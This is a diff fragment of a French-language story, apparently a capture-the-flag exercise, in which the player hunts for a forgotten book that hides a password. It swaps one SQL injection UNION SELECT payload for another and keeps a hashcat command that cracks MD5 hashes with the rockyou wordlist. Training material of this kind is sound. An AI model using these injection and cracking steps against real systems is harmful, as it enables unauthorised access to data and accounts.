@@ -192,7 +192,7 @@ Pendant votre périple vers Rodia, Vaylin vous confie un nouvel indice crucial. 
 
 Votre mission s’annonce aussi périlleuse qu’essentielle : dénicher ce livre oublié et en extraire le mot de passe dissimulé entre ses lignes. 
 
-PAYLOAD = ' UNION SELECT NULL, livre, secret, NULL, NULL FROM users #
+' UNION SELECT NULL, nom, secret, NULL FROM livres #
 
 hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 
